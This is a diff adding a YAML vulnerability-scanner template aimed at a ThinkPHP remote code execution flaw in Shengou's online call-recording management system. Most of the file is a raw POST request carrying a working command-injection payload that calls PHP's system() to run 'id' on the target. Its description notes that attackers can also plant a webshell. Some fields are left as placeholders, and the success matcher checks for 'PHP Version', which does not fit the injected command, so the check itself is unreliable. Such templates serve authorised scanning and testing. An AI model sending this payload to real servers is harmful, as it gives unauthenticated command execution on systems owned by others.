@@ -1,0 +1,27 @@
+id: shengou-index-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 申瓯通信在线录音管理系统存在Thinkphp远程代码执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意指令或写入webshell，导致服务器权限被控，造成严重威胁。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FThinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        s=id&_method=__construct&method=POST&filter[]=system
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PHP Version'
